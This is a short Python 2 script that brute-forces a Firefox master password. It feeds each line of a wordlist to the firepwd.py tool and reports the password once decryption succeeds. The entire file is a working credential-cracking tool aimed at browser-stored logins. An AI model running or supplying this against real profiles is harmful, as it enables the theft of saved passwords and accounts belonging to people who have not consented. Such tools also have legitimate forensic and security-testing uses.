import sys
from subprocess import Popen, PIPE

f = open(sys.argv[1], 'r')
for line in f:

	password = line.strip()

	p = Popen(['./firepwd.py', '-p', password, '-d', './'], stdout=PIPE)
	output = p.stdout.read()

	if output.find('decrypting') != -1 :
		print "[+] Master Password: "  + password
		sys.exit(0)

	print "[-] Failed with Master Password: " +password

print "Failure! Master Password could not be Found with the existing dictionary!"
